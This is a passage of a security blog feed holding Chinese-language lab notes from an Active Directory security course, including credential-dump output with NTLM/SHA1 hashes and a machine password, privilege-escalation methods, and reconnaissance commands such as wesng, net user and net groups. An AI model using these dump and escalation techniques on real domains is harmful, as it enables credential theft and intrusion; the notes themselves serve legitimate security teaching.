&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma.org
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">70283&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:0001128b&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : DWM-1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : Window Manager
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:22:24
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-90-0-1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma.org
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">996&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000003e4&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Service from &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:22:21
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-20
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : desktop-g95u93t$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">46383&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:0000b52f&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : UMFD-0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : Font Driver Host
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:22:20
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-96-0-0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma.org
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">46347&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:0000b50b&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : UMFD-1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : Font Driver Host
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:22:20
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-96-0-1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma.org
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">45411&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:0000b163&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : UndefinedLogonType from &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:22:17
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">999&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000003e7&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : UndefinedLogonType from &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/5 上午 12:22:17
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-18
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : desktop-g95u93t$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(利用弱點)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x09%E5%88%A9%E7%94%A8%E5%BC%B1%E9%BB%9E/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x09%E5%88%A9%E7%94%A8%E5%BC%B1%E9%BB%9E/</guid><description>&lt;h1 id="ntustisc---ad-note---lab利用弱點">
 NTUSTISC - AD Note - Lab(利用弱點)
 &lt;a class="anchor" href="#ntustisc---ad-note---lab%e5%88%a9%e7%94%a8%e5%bc%b1%e9%bb%9e">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=M0LV3dBCMCOy58LN&amp;amp;t=3600">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://zhuanlan.zhihu.com/p/145430397">Internet Information Services(IIS)&lt;/a>
&lt;blockquote>
&lt;p>IIS是縮寫，全稱Internet Information Services ( IIS,互聯網信息服務 ),是由微軟公司提供的基於運行Microsoft Windows的互聯網基本服務。&lt;/p>
&lt;p>IIS是指World Wide Web server服務，IIS是一種Web（網頁）服務組件，專業的說，IIS可以賦予一部主機電腦一組以上的IP地址，而且還可以有一個以上的域名作為Web網站。做過服務器配置的都應該知道IIS。制作好了網站怎麽才能讓別人瀏覽，就是通過網站服務器來實現的。IIS只是網站服務器的一種而已。&lt;/p>
&lt;h3 id="簡單來說">
 簡單來說：
 &lt;a class="anchor" href="#%e7%b0%a1%e5%96%ae%e4%be%86%e8%aa%aa">#&lt;/a>
&lt;/h3>
&lt;p>Internet Information Service（IIS）是windows開設web網頁服務的組件，用來搭載網站運行程序的平台的。還能提供FTP，SMTP等服務。&lt;/p>
&lt;p>&lt;font color="ff0000">在UNIX或Linux平台上，Apache就是網站服務器。&lt;/p>
&lt;p>而對於Windows NT/2000來說，IIS就是標準的網站服務器。&lt;/font>&lt;/p>
&lt;p>IIS是一種服務，是Windows 2000 Server系列的一個組件。不同於一般的應用程序，它就像驅動程序一樣是操作系統的一部分，具有在系統啟動時被同時啟動的服務功能。
如果想知道如何在win10啟用IIS或是建置網站server，可以看這個影片&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>一般權限(就像前面的lab那樣)
&lt;ul>
&lt;li>取得網域使用者資訊&lt;/li>
&lt;li>Scan Port&lt;/li>
&lt;li>Check Group Policy Object&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>高權限好處
&lt;ul>
&lt;li>Dump Password or Hash&lt;/li>
&lt;li>Turn off Defender&lt;/li>
&lt;li>Check the other users&amp;rsquo; info&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>本地特出使用者
&lt;ul>
&lt;li>==NT Authority\System==(本地端真正的最高權限使用者)&lt;/li>
&lt;li>NT Authority\Network Service&lt;/li>
&lt;li>NT Authority\Local Service&lt;/li>
&lt;li>NT Authority\IUSR&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>提權方法
&lt;ul>
&lt;li>利用弱點(通常是直接用Windows CVE直接打看看)，可參考&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>&lt;/li>
&lt;li>Hijack Token&lt;/li>
&lt;li>Guess Password
就像前面環境觀察中提到的一樣，可以從&lt;code>Active Directory Users and Computers&lt;/code>的description中看看有沒有密碼的提示，或是查看&lt;code>$ net user&lt;/code>變更密碼的時間是哪時候，然後考慮爆破
&lt;ul>
&lt;li>Local Admin比Domain Admin好拿&lt;/li>
&lt;li>通常是固定密碼
&lt;ul>
&lt;li>所有主機都相同&lt;/li>
&lt;li>可能很多人知道&lt;/li>
&lt;li>弱密碼&lt;/li>
&lt;li>系統初始化包&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Solution: 可以參考&lt;a href="https://learn.microsoft.com/zh-tw/windows-server/identity/laps/laps-overview">本機系統管理員密碼解決方案(LAPS)&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>管理服務&lt;/li>
&lt;li>錯誤配置&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="lab-time---本地提權">
 Lab Time - 本地提權
 &lt;a class="anchor" href="#lab-time---%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%ac%8a">#&lt;/a>
&lt;/h2>
&lt;h3 id="利用弱點">
 ==利用弱點==
 &lt;a class="anchor" href="#%e5%88%a9%e7%94%a8%e5%bc%b1%e9%bb%9e">#&lt;/a>
&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ git clone https://github.com/bitsadmin/wesng.git --depth &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cd wesng
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ python wes.py --update
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ systeminfo.exe &amp;gt; systeminfo.txt &lt;span style="color:#75715e"># 這條指令是windows內建的指令，所以一定要在cmd中操作&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ python wes.py systeminfo.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::spoiler Result&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(查詢本地使用者)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x02%E6%9F%A5%E8%A9%A2%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E8%80%85/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x02%E6%9F%A5%E8%A9%A2%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E8%80%85/</guid><description>&lt;h1 id="ntustisc---ad-note---lab查詢本地使用者">
 NTUSTISC - AD Note - Lab(查詢本地使用者)
 &lt;a class="anchor" href="#ntustisc---ad-note---lab%e6%9f%a5%e8%a9%a2%e6%9c%ac%e5%9c%b0%e4%bd%bf%e7%94%a8%e8%80%85">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=SycYwgWohlu97dc3">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="lab-time---環境調查">
 Lab Time - 環境調查
 &lt;a class="anchor" href="#lab-time---%e7%92%b0%e5%a2%83%e8%aa%bf%e6%9f%a5">#&lt;/a>
&lt;/h2>
&lt;h3 id="查詢本地使用者">
 ==查詢本地使用者==
 &lt;a class="anchor" href="#%e6%9f%a5%e8%a9%a2%e6%9c%ac%e5%9c%b0%e4%bd%bf%e7%94%a8%e8%80%85">#&lt;/a>
&lt;/h3>
&lt;p>常用的cheat sheet&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ net user
$ net user &amp;lt;username&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::spoiler Implementation&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ net user

\\DESKTOP-G95U93T 的使用者帳戶

-------------------------------------------------------------------------------
Administrator DefaultAccount Guest
low user WDAGUtilityAccount
命令已經成功完成。
$ net user administrator
使用者名稱 Administrator
全名
註解 管理電腦/網域的內建帳戶
使用者的註解
國家/區域碼 000 (系統預設值)
帳戶使用中 Yes
帳戶到期 從不

上次設定密碼 ‎2021/‎9/‎28 下午 10:10:39
密碼到期 從不
可變更密碼 ‎2021/‎9/‎28 下午 10:10:39
請輸入密碼 Yes
使用者可以變更密碼 Yes

容許的工作站 全部
登入指令檔
使用者設定檔
主目錄
上次登入時間 ‎2023/‎8/‎26 上午 12:48:36

可容許的登入時數 全部

本機群組會員 *Administrators
全域群組會員 *None
命令已經成功完成。
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(查詢網域群組)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x06%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E7%BE%A4%E7%B5%84/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x06%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E7%BE%A4%E7%B5%84/</guid><description>&lt;h1 id="ntustisc---ad-note---lab查詢網域群組">
 NTUSTISC - AD Note - Lab(查詢網域群組)
 &lt;a class="anchor" href="#ntustisc---ad-note---lab%e6%9f%a5%e8%a9%a2%e7%b6%b2%e5%9f%9f%e7%be%a4%e7%b5%84">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=SycYwgWohlu97dc3">2022/05/04 AD 安全1&lt;/a>&lt;/p>
&lt;h2 id="lab-time---環境調查">
 Lab Time - 環境調查
 &lt;a class="anchor" href="#lab-time---%e7%92%b0%e5%a2%83%e8%aa%bf%e6%9f%a5">#&lt;/a>
&lt;/h2>
&lt;h3 id="查詢網域群組">
 ==查詢網域群組==
 &lt;a class="anchor" href="#%e6%9f%a5%e8%a9%a2%e7%b6%b2%e5%9f%9f%e7%be%a4%e7%b5%84">#&lt;/a>
&lt;/h3>
&lt;p>常用的cheat sheet
&lt;code>Domain Admins&lt;/code>, &lt;code>Schema Admins&lt;/code>, &lt;code>Enterprise Admins&lt;/code>是預設的權限，通常一進到AD網域都會先看這幾個權限有哪些成員&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ net groups /domain # 查詢網域中群組的資料
$ net groups &amp;#34;Domain Admins&amp;#34; /domain
$ net groups &amp;#34;Schema Admins&amp;#34; /domain
$ net groups &amp;#34;Enterprise Admins&amp;#34; /domain
&lt;/code>&lt;/pre>&lt;p>:::spoiler Implementation&lt;/p>
